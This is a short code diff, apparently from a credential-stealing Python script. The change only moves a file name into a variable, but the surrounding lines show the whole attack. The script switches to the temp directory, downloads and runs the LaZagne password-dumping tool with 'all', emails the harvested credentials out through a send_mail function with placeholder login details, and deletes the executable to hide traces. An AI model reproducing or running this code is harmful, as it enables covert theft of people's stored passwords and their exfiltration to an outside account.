@@ -29,7 +29,7 @@ def send_mail(email, password, message):
 temp_directory = tempfile.gettempdir()
 os.chdir(temp_directory)
 exec_file = "lazagne.exe"
-download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
+download(f"https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/{exec_file}")
 result = subprocess.check_output(exec_file + " all", shell=True)
 send_mail("SET_EMAIL_HERE", "SET_PASSWORD_HERE", result)
 os.remove(exec_file)
